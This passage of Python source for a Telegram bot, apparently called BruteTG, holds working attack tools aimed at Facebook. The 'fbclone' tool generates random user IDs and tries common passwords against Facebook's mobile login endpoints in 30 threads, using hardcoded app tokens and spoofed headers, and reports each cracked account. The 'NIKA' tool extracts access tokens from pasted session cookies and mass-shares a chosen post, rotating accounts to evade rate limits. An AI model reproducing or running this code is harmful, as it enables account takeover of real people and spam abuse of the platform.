            await update.message.reply_text("❌ Enter a valid positive number."); return STATE_AUTHENTICATED
        ctx.user_data["clone_count"] = n
        ctx.user_data["clone_step"]  = "method"
        await update.message.reply_text(
            "⚙️ Choose brute method:\n\n"
            "`1` — Method 1  (b-graph.facebook.com/auth/login)\n"
            "`2` — Method 2  (b-api.facebook.com/method/auth.login)\n\n"
            "Reply with *1* or *2*:",
            parse_mode="Markdown",
        )
        return STATE_AUTHENTICATED

    elif step == "method":
        if text not in ("1","2"):
            await update.message.reply_text("❌ Reply with 1 or 2."); return STATE_AUTHENTICATED
        ctx.user_data["clone_step"] = None
        ctx.user_data.pop("active_tool", None)
        series  = ctx.user_data.get("clone_series","A")
        count   = ctx.user_data.get("clone_count",1000)
        method  = text
        bot     = ctx.application.bot
        chat_id = update.effective_chat.id
        threading.Thread(
            target=run_fbclone,
            args=(bot, chat_id, tg_id, username, series, count, method),
            daemon=True,
        ).start()
        return STATE_AUTHENTICATED

    await update.message.reply_text("Unknown step. Use /fbclone to restart.")
    return STATE_AUTHENTICATED


def gen_uids(series: str, count: int) -> list:
    uids = []
    for _ in range(count):
        if series == "A":
            uid = str(random.randint(1000000000, 4999999999))
        elif series == "B":
            prefix = random.choice(["100003","100004"])
            uid    = prefix + "".join(random.choices(string.digits, k=9))
        else:
            uid = "1000004" + "".join(random.choices(string.digits, k=8))
        uids.append(uid)
    return uids


def estimate_year(uid: str) -> str:
    if len(uid) in (9,10): return "2008"
    if len(uid) == 8:      return "2007"
    if len(uid) == 7:      return "2006"
    if len(uid) == 15:
        if uid.startswith(("100000000","1000000")): return "2009"
        if uid.startswith("100001"):                return "2010"
        if uid.startswith(("100002","100003")):     return "2011"
        if uid.startswith("100004"):                return "2012"
        if uid.startswith(("100005","100006")):     return "2013"
        if uid.startswith(("100007","100008")):     return "2014"
        if uid.startswith("100009"):                return "2015"
    return ""


def _clone_m1(uid: str) -> tuple:
    """Method 1 — b-graph.facebook.com (from zip fbclone_login_1)."""
    ses = requests.Session()
    try:
        for pw in ("123456","1234567","12345678","123456789"):
            data = {
                "adid":                     str(uuid.uuid4()),
                "format":                   "json",
                "device_id":                str(uuid.uuid4()),
                "cpl":                      "true",
                "family_device_id":         str(uuid.uuid4()),
                "credentials_type":         "device_based_login_password",
                "error_detail_type":        "button_with_disabled",
                "source":                   "device_based_login",
                "email":                    str(uid),
                "password":                 str(pw),
                "access_token":             "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta":          "",
                "advertiser_id":            str(uuid.uuid4()),
                "currently_logged_in_userid": "0",
                "locale":                   "en_US",
                "client_country_code":      "US",
                "method":                   "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class":      "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key":                  "882a8490361da98702bf97a021ddc14d",
            }
            headers = {
                "User-Agent":             windows_ua(),
                "Content-Type":           "application/x-www-form-urlencoded",
                "Host":                   "graph.facebook.com",
                "X-FB-Net-HNI":           "25227",
                "X-FB-SIM-HNI":           "29752",
                "X-FB-Connection-Type":   "MOBILE.LTE",
                "X-Tigon-Is-Retry":       "False",
                "x-fb-session-id":        "nid=jiZ+yNNBgbwC;pid=Main;tid=132;",
                "x-fb-device-group":      "5120",
                "X-FB-Friendly-Name":     "ViewerReactionsMutation",
                "X-FB-Request-Analytics-Tags": "graphservice",
                "X-FB-HTTP-Engine":       "Liger",
                "X-FB-Client-IP":         "True",
                "X-FB-Server-Cluster":    "True",
                "x-fb-connection-token":  "d29d67d37eca387482a8a5b740f84f62",
            }
            res = ses.post(
                "https://b-graph.facebook.com/auth/login",
                data=data, headers=headers, allow_redirects=False, timeout=15,
            ).json()
            if "session_key" in res:
                return True, uid, pw
            err_msg = res.get("error",{}).get("message","")
            if "www.facebook.com" in err_msg:
                return True, uid, pw
    except Exception:
        pass
    return False, uid, ""


def _clone_m2(uid: str) -> tuple:
    """Method 2 — b-api.facebook.com (from zip fbclone_login_2)."""
    for pw in ("123456","123123","1234567","12345678","123456789"):
        try:
            with requests.Session() as ses:
                headers = {
                    "x-fb-connection-bandwidth": str(random.randint(20000000,29999999)),
                    "x-fb-sim-hni":              str(random.randint(20000,40000)),
                    "x-fb-net-hni":              str(random.randint(20000,40000)),
                    "x-fb-connection-quality":   "EXCELLENT",
                    "x-fb-connection-type":      "cell.CTRadioAccessTechnologyHSDPA",
                    "user-agent":                windows_ua(),
                    "content-type":              "application/x-www-form-urlencoded",
                    "x-fb-http-engine":          "Liger",
                }
                url = (
                    f"https://b-api.facebook.com/method/auth.login"
                    f"?format=json&email={uid}&password={pw}"
                    f"&credentials_type=device_based_login_password"
                    f"&generate_session_cookies=1&error_detail_type=button_with_disabled"
                    f"&source=device_based_login&meta_inf_fbmeta=%20"
                    f"&locale=en_US&client_country_code=US"
                    f"&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                    f"&fb_api_req_friendly_name=authenticate&cpl=true"
                )
                po = ses.get(url, headers=headers, timeout=15).json()
                if "session_key" in str(po):
                    return True, uid, pw
        except Exception:
            pass
    return False, uid, ""


def run_fbclone(bot, chat_id: int, tg_id: str, username: str,
                series: str, count: int, method: str):
    """FB Clone brute — runs entirely in background thread, no async needed."""
    series_label = {"A":"All (2010-2014)","B":"100003/4 Series","C":"2009 Series"}.get(series,series)
    msg = tg_send(
        bot, chat_id,
        f"🔓 *FB Clone Starting...*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📋 Series:  `{series_label}`\n"
        f"🔢 UIDs:    `{count}`\n"
        f"⚙️ Method:  `Method {method}`\n"
        f"🧵 Threads: `30`\n\n"
        f"⣾ `[░░░░░░░░░░░░░░░░░░░░]` `0/{count}`\n"
        f"🔍 Searching...",
    )
    progress_msg_id = msg.message_id if msg else None
    log_activity(tg_id, username, "FBCLONE", "start", f"series={series} count={count} m={method}")

    uids      = gen_uids(series, count)
    ok_list   = []
    clone_fn  = _clone_m1 if method == "1" else _clone_m2
    done      = 0
    last_edit = time.time()

    with ThreadPoolExecutor(max_workers=30) as pool:
        futures = {pool.submit(clone_fn, uid): uid for uid in uids}
        for future in as_completed(futures):
            done += 1
            try:
                found, uid, pw = future.result()
                if found:
                    year = estimate_year(uid)
                    ok_list.append(f"{uid}|{pw}")
                    tg_send(
                        bot, chat_id,
                        f"🔓 *CRACKED!*\n"
                        f"━━━━━━━━━━━━━\n"
                        f"🆔 UID:  `{uid}`\n"
                        f"🔑 Pass: `{pw}`\n"
                        f"📅 Year: `{year or 'unknown'}`\n"
                        f"✅ Total cracked: `{len(ok_list)}`",
                    )
                    log_activity(tg_id, username, "FBCLONE", "cracked", f"uid={uid} pw={pw}", ok=True)
            except Exception:
                pass

            # Update progress bar every 100 UIDs
            if progress_msg_id and done % 100 == 0 and time.time() - last_edit > 3:
                tg_edit(
                    bot, chat_id, progress_msg_id,
                    f"🔓 *FB Clone Running...*\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📋 Series: `{series_label}`\n"
                    f"⚙️ Method: `Method {method}`\n\n"
                    f"{spinner_frames(done, count)}\n"
                    f"✅ Cracked: `{len(ok_list)}`  🔍 Tried: `{done}`",
                )
                last_edit = time.time()

    tg_send(
        bot, chat_id,
        f"🏁 *FB Clone — DONE!*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ *Cracked:* `{len(ok_list)}`\n"
        f"🔢 *Tried:*   `{count}`\n\n"
        "Use /menu to run another tool.",
    )
    log_activity(tg_id, username, "FBCLONE", "done", f"cracked={len(ok_list)} tried={count}")


# ══════════════════════════════════════════════════════════════════════════════
#  NIKA — Spam Share (Cookie-Based Post Sharer, NO LIMITS, from zip)
# ══════════════════════════════════════════════════════════════════════════════

async def cmd_nika(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    tg_id = str(update.effective_user.id)
    if not sessions.get(tg_id, {}).get("verified"):
        await update.message.reply_text("❌ Not authenticated. Use /start."); return ConversationHandler.END
    ctx.user_data.update({
        "active_tool": "nika", "nika_step": "cookie_count",
        "nika_tokens": [], "nika_cookies_list": [],
        "nika_cookie_idx": 0, "nika_total_cookies": 0,
    })
    await update.message.reply_text(
        "📤 *NIKA Spam Share*\n"
        "Cookie-Based Facebook Post Sharer\n\n"
        "Supports multiple cookies for high-speed sharing.\n\n"
        "How many cookies to use? (1-10)\n\n"
        "Reply with a number:",
        parse_mode="Markdown",
    )
    return STATE_AUTHENTICATED


async def handle_nika_input(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    tg_id    = str(update.effective_user.id)
    username = sessions.get(tg_id, {}).get("username","")
    step     = ctx.user_data.get("nika_step","")
    text     = update.message.text.strip()

    # Step 1 — how many cookies
    if step == "cookie_count":
        try:
            n = int(text)
            if n < 1 or n > 10: raise ValueError
        except ValueError:
            await update.message.reply_text("❌ Enter a number between 1 and 10."); return STATE_AUTHENTICATED
        ctx.user_data["nika_total_cookies"] = n
        ctx.user_data["nika_cookie_idx"]    = 1
        ctx.user_data["nika_step"]          = "cookie_input"
        await update.message.reply_text(
            f"🍪 *Cookie #1 of {n}*\n\n"
            "Paste your Facebook session cookie string:\n"
            "Format: c_user=123; xs=abc; datr=xyz; fr=...; sb=...",
            parse_mode="Markdown",
        )
        return STATE_AUTHENTICATED

    # Step 2 — collect each cookie & extract EAAG token
    elif step == "cookie_input":
        idx   = ctx.user_data.get("nika_cookie_idx", 1)
        total = ctx.user_data.get("nika_total_cookies", 1)

        # Parse cookie string
        cookies: dict[str, str] = {}
        for part in text.split(";"):
            part = part.strip()
            if "=" in part:
                k, _, v = part.partition("=")
                cookies[k.strip()] = v.strip()

        if not cookies.get("c_user") and not cookies.get("xs"):
            await update.message.reply_text(
                "❌ Invalid cookie. Must contain c_user= and xs= fields.\n\nPaste again:",
                parse_mode="Markdown",
            )
            return STATE_AUTHENTICATED

        processing_msg = await update.message.reply_text(
            f"⏳ Extracting EAAG token from cookie #{idx}..."
        )

        # Extract token in a thread (blocking HTTP)
        token = await asyncio.get_event_loop().run_in_executor(
            None, _extract_nika_token, cookies
        )

        if token:
            ctx.user_data["nika_tokens"].append(token)
            ctx.user_data["nika_cookies_list"].append(cookies)
            await processing_msg.edit_text(
                f"✅ *Cookie #{idx}* — Token extracted!\n`{token[:30]}...`",
                parse_mode="Markdown",
            )
        else:
            await processing_msg.edit_text(
                f"❌ *Cookie #{idx}* — Token extraction failed. Cookie may be expired.\n"
                "_Skipping this cookie._",
                parse_mode="Markdown",
            )

        if idx < total:
            ctx.user_data["nika_cookie_idx"] = idx + 1
            await update.message.reply_text(
                f"🍪 *Cookie #{idx+1} of {total}*\n\nPaste next cookie:",
                parse_mode="Markdown",
            )
            return STATE_AUTHENTICATED

        # All cookies collected
        tokens = ctx.user_data.get("nika_tokens",[])
        if not tokens:
            await update.message.reply_text("❌ No valid cookies. Use /nika to try again.")
            ctx.user_data.pop("active_tool", None)
            return STATE_AUTHENTICATED

        ctx.user_data["nika_step"] = "link"
        await update.message.reply_text(
            f"✅ *{len(tokens)} valid token(s) ready!*\n\n"
            "📎 Now paste the *Facebook post URL* to spam share:\n\n"
            "_Supports posts, photos, videos, reels_\n\n"
            "Example:\n`https://www.facebook.com/photo?fbid=12345`",
            parse_mode="Markdown",
        )
        return STATE_AUTHENTICATED

    # Step 3 — post URL
    elif step == "link":
        if not text.startswith("http") or "facebook.com" not in text.lower():
            await update.message.reply_text(
                "❌ Please enter a valid Facebook URL.\n\n"
                "Example: `https://www.facebook.com/photo?fbid=123456789`",
                parse_mode="Markdown",
            )
            return STATE_AUTHENTICATED
        ctx.user_data["nika_link"] = text
        ctx.user_data["nika_step"] = "count"
        await update.message.reply_text(
            "🔢 *How many times to share?*\n\n"
            "_No limit — you decide how many (e.g. 100, 1000, 5000, 50000)_\n\n"
            "Reply with any positive number:",
            parse_mode="Markdown",
        )
        return STATE_AUTHENTICATED

    # Step 4 — share count → launch
    elif step == "count":
        try:
            n = int(text)
            if n < 1: raise ValueError
        except ValueError:
            await update.message.reply_text("❌ Enter a valid positive number."); return STATE_AUTHENTICATED

        link    = ctx.user_data.get("nika_link","")
        tokens  = ctx.user_data.get("nika_tokens",[])
        cookies = ctx.user_data.get("nika_cookies_list",[])
        ctx.user_data["nika_step"] = None
        ctx.user_data.pop("active_tool", None)

        bot     = ctx.application.bot
        chat_id = update.effective_chat.id

        threading.Thread(
            target=run_nika,
            args=(bot, chat_id, tg_id, username, tokens, cookies, link, n),
            daemon=True,
        ).start()
        return STATE_AUTHENTICATED

    await update.message.reply_text("Unknown step. Use /nika to restart.")
    return STATE_AUTHENTICATED


def _extract_nika_token(cookies: dict) -> str | None:
    """Extract EAAG token from Facebook business page (from zip nika_login)."""
    try:
        ses = requests.Session()
        r = ses.get(
            "https://business.facebook.com/business_locations",
            headers={
                "user-agent":      random.choice(NIKA_UA_LIST),
                "referer":         "https://www.facebook.com/",
                "host":            "business.facebook.com",
                "origin":          "https://business.facebook.com",
                "upgrade-insecure-requests": "1",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control":   "max-age=0",
                "accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type":    "text/html; charset=utf-8",
            },
            cookies=cookies, timeout=15,
        )
        m = re.search(r"(EAAG\w+)", r.text)
        if m:
            return m.group(1)
    except Exception:
        pass
    return None


def _nika_share_once(token: str, cookie: dict, link: str,
                     account_shares: dict, failed_accounts: set) -> bool:
    """Single share attempt — from zip nika_share_post logic exactly."""
    if token in failed_accounts:
        return False

    for attempt in range(20):  # 20 retries (from zip)
        try:
            ua = random.choice(NIKA_UA_LIST)
            if any(k in link.lower() for k in ("video","reel","watch")):
                headers = {
                    "authority":        "graph.facebook.com",
                    "cache-control":    "max-age=0",
                    "sec-ch-ua-mobile": "?0",
                    "user-agent":       ua,
                    "accept":           "application/json",
                    "content-type":     "application/x-www-form-urlencoded",
                    "sec-fetch-mode":   "cors",
                    "sec-fetch-site":   "cross-site",
                }
            else:
                headers = {
                    "authority":        "graph.facebook.com",
                    "cache-control":    "max-age=0",
                    "sec-ch-ua-mobile": "?0",
                    "user-agent":       ua,
                }

            resp = requests.post(
                f"https://graph.facebook.com/v18.0/me/feed"
                f"?link={link}&published=0&access_token={token}",
                headers=headers, cookies=cookie, timeout=25,
            )
            data = resp.json()

            if "id" in data:
                account_shares[token] = account_shares.get(token, 0) + 1
                return True

            elif "error" in data:
                err_msg = data["error"].get("message","").lower()
                if any(k in err_msg for k in ["rate limit","suspended","blocked",
                                               "checkpoint","temporarily blocked",
                                               "account disabled","login required"]):
                    failed_accounts.add(token)
                    return False
                elif any(k in err_msg for k in ["video","reel","content"]):
                    time.sleep(3); continue
                else:
                    return False

        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            time.sleep(1); continue
        except Exception:
            return False

    return False


def run_nika(bot, chat_id: int, tg_id: str, username: str,
             tokens: list, cookies_list: list, link: str, limit: int):
    """NIKA spam share — fully synchronous, runs in background thread."""
    msg = tg_send(
        bot, chat_id,
        f"📤 *NIKA Spam Share Starting...*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🍪 Cookies/Tokens: `{len(tokens)}`\n"
        f"🔗 Link: `{link[:60]}{'...' if len(link)>60 else ''}`\n"
        f"🔢 Target shares: `{limit}`\n\n"
        f"⣾ `[░░░░░░░░░░░░░░░░░░░░]` `0/{limit}`\n"
        f"⚙️ Warming up threads...",
    )
    progress_msg_id = msg.message_id if msg else None
    log_activity(tg_id, username, "NIKA", "start", f"limit={limit} cookies={len(tokens)}")

    account_shares: dict[str, int] = {t: 0 for t in tokens}
    failed_accounts: set[str] = set()
    start_time    = time.time()
    success_count = 0
    fail_count    = 0
    per_acct_max  = 60   # cooldown threshold per account (from zip)
    last_edit     = time.time()
    last_progress = 0

    for n in range(1, limit + 1):
        # Pick available token (least shares, not failed)
        available = [t for t in tokens if account_shares.get(t,0) < per_acct_max and t not in failed_accounts]
        if not available:
            # Reset counters and take 10s cooldown (from zip)
            time.sleep(10)
            for t in tokens:
                if t not in failed_accounts:
                    account_shares[t] = 0
            available = [t for t in tokens if t not in failed_accounts]
        if not available:
            tg_send(bot, chat_id, f"⚠️ All cookies failed/blocked. Stopped at `{n-1}` shares.")
            break

        token  = min(available, key=lambda t: account_shares.get(t,0))
        cookie = cookies_list[tokens.index(token)]

        ok = _nika_share_once(token, cookie, link, account_shares, failed_accounts)
        if ok:
            success_count += 1
        else:
            fail_count += 1

        time.sleep(0.1)  # 0.1s delay per share (from zip)

        # Cooldown every 60 shares (from zip)
        if n % 60 == 0:
            time.sleep(10)

        # Update progress bar every 50 shares
        if n - last_progress >= 50 and time.time() - last_edit > 2:
            elapsed = int(time.time() - start_time)
            mins, secs = divmod(elapsed, 60)
            rate = round(success_count / max(elapsed, 1) * 60, 1)
            tg_send(
                bot, chat_id,
                f"📊 *NIKA Progress Update*\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"{spinner_frames(n, limit)}\n"
                f"✅ Shared:  `{success_count}`\n"
                f"❌ Failed:  `{fail_count}`\n"
                f"⏱️ Time:    `{mins}m {secs}s`\n"
                f"⚡ Rate:    `{rate}/min`\n"
                f"🍪 Active tokens: `{len(tokens) - len(failed_accounts)}/{len(tokens)}`",
            )
            last_progress = n
            last_edit = time.time()

    elapsed = int(time.time() - start_time)
    mins, secs = divmod(elapsed, 60)
    tg_send(
        bot, chat_id,
        f"🏁 *NIKA Spam Share — DONE!*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ *Shared:*  `{success_count}`\n"
        f"❌ *Failed:*  `{fail_count}`\n"
        f"🔢 *Target:*  `{limit}`\n"
        f"⏱️ *Time:*    `{mins}m {secs}s`\n\n"
        "Use /menu to run another tool.",
    )
    log_activity(tg_id, username, "NIKA", "done", f"ok={success_count} fail={fail_count}")


# ─── /logout ──────────────────────────────────────────────────────────────────
async def cmd_logout(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    tg_id    = str(update.effective_user.id)
    username = sessions.get(tg_id, {}).get("username","")
    sessions.pop(tg_id, None)
    ctx.user_data.clear()
    log_activity(tg_id, username, "AUTH", "logout", "")
    await update.message.reply_text(
        "👋 Logged out. Send /start to log in again.",
        reply_markup=ReplyKeyboardRemove(),
    )
    return ConversationHandler.END


# ─── Fallback ─────────────────────────────────────────────────────────────────
async def fallback_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    tg_id = str(update.effective_user.id)
    if not sessions.get(tg_id, {}).get("verified"):
        await update.message.reply_text("Use /start to register or log in.")
        return STATE_IDLE
    tool = ctx.user_data.get("active_tool")
    if tool == "au2":     return await handle_au2_input(update, ctx)
    if tool == "fbclone": return await handle_clone_input(update, ctx)
    if tool == "nika":    return await handle_nika_input(update, ctx)
    await update.message.reply_text("Unknown command. Use /menu to see tools or /help.")
    return STATE_AUTHENTICATED


# ─── Main ─────────────────────────────────────────────────────────────────────
async def post_init(application: Application):
    """Capture the running event loop for thread-safe message sending."""
    global _bot_loop
    _bot_loop = asyncio.get_running_loop()
    log.info("Bot event loop captured for thread-safe messaging.")


def main():
    if not BOT_TOKEN:
        log.error("BOT_TOKEN environment variable is not set!")
        sys.exit(1)

    try:
        import bs4, fake_useragent, faker
    except ImportError:
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install",
                               "beautifulsoup4", "fake-useragent", "faker", "-q"])

    threading.Thread(target=keep_alive, daemon=True).start()
    log.info("Keep-alive thread started")

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .build()
    )

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", cmd_start)],
        states={
            STATE_IDLE: [
                CommandHandler("start",   cmd_start),
                CommandHandler("status",  cmd_status),
                CommandHandler("help",    cmd_help),
            ],
            STATE_AWAIT_USERNAME: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, recv_username),
            ],
            STATE_AWAIT_PASSWORD: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, recv_password),
            ],
            STATE_AUTHENTICATED: [
                CommandHandler("menu",    cmd_menu),
                CommandHandler("status",  cmd_status),
                CommandHandler("logout",  cmd_logout),
                CommandHandler("au2",     cmd_au2),
                CommandHandler("fbclone", cmd_fbclone),
                CommandHandler("nika",    cmd_nika),
                CommandHandler("help",    cmd_help),
                CallbackQueryHandler(handle_callback),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_keyboard),
            ],
        },
        fallbacks=[
            CommandHandler("logout", cmd_logout),
            CommandHandler("start",  cmd_start),
        ],
        allow_reentry=True,
        per_message=False,
    )

    app.add_handler(conv)
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("help",   cmd_help))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, fallback_message))

    log.info("BruteTG bot starting polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
